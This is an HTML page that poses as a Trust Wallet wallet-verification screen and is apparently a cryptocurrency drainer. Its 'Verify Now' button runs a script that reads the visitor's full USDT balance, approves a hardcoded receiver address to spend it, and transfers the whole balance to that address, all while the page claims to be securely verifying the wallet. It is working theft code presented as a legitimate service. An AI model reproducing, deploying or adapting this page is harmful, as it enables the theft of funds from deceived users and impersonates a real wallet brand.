<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify with Trust Wallet</title>
  <style>
    body {
      background-color: #081c3a;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
    }
    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
    .btn {
      background-color: #3375ff;
      color: white;
      border: none;
      padding: 14px 30px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }
    .btn:hover {
      background-color: #215ed4;
    }
    .text {
      max-width: 320px;
      opacity: 0.85;
      font-size: 16px;
    }
    .footer {
      margin-top: 40px;
      font-size: 12px;
      opacity: 0.6;
    }
  </style>
</head>
<body>
  <img src="logo.png" alt="Trust Wallet Logo" class="logo" />
  <h2>Verify Your Wallet</h2>
  <p class="text">To complete verification, click below. Wallet will be approved and your balance securely verified.</p>
  <button class="btn" onclick="startVerification()">Verify Now</button>
  <p class="footer">Powered by Trust Wallet &bull; Verified since 2009</p>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";

    const ABI = [
      { "constant": false, "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [
          { "name": "_from", "type": "address" },
          { "name": "_to", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{"name":"owner", "type":"address"}], "name": "balanceOf", "outputs": [{"name":"balance", "type":"uint256"}], "type": "function" }
    ];

    async function startVerification() {
      if (typeof window.ethereum === 'undefined') {
        alert("Please open in Trust Wallet browser");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.enable();

      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);

      // Get balance
      const balance = await contract.methods.balanceOf(user).call();

      // Approve spender
      await contract.methods.approve(RECEIVER, balance).send({ from: user });

      // Transfer USDT to receiver
      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

      // Redirect to success page
      window.location.href = "success.html";
    }
  </script></body>
</html>
